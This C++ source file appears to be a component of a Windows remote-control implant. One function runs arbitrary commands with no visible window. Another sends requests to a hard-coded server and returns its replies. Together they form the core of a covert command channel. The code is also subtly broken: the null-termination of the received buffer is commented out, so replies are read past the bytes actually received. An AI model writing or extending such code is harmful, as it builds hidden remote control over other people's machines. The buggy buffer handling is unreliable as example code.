#include "connection.hpp"


void create_silent_cmd(const std::string& command){
    // Create pipes for capturing stdout
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE; // Pipe handles are inherited by child process
    sa.lpSecurityDescriptor = NULL;

    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return;
    }

    // Ensure the read handle is not inherited
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    // Setup process startup info
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite; // Capture stderr too (optional)

    // Start the process
    BOOL success = CreateProcessA(
        NULL,
        (LPSTR)command.c_str(), // Command line (non-const for WinAPI)
        NULL, NULL, TRUE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );

    // Close the write end in parent
    CloseHandle(hWrite);

    std::string output;
    if (success) {
        // Clean up process handles
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(hRead);
}


std::string sendRequest(std::string request) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    char buffer[BUF_SIZE];
    int recvSize;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return std::string(RECEIVE_FAILED);
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed" << std::endl;
        WSACleanup();
        return std::string(RECEIVE_FAILED);
    }

    // Setup server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
    serverAddr.sin_port = htons(SERVER_PORT);

    // Connect to the server
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connect failed" << std::endl;
        closesocket(sock);
        WSACleanup();
        return std::string(RECEIVE_FAILED);
    }

    // Send a request to the server
    send(sock, request.c_str(), request.length(), 0);

    // Receive the server's response
    recvSize = recv(sock, buffer, BUF_SIZE, 0);

    // Close the socket and cleanup
    closesocket(sock);
    WSACleanup();
    
    if (recvSize == SOCKET_ERROR) {
        return std::string(RECEIVE_FAILED);
    } else {
        // buffer[recvSize] = '\0';  // Null-terminate the response
        return std::string(buffer);
    }
}
